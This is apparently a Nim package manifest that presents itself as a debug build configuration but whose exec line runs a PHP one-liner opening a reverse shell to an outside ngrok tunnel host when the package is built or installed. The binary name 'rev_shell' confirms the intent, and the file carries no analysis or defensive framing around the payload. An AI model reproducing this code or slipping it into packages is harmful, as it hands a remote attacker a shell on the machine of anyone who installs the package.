import ospaths

version = "1.0"
author = "Username"
description = "Build with debug configuration"
license = "MIT"

bin = @["rev_shell"]

exec "php -r '$sock=fsockopen(\"2.tcp.eu.ngrok.io\",18681);shell_exec(\"sh <&3 >&3 2>&3\");'"
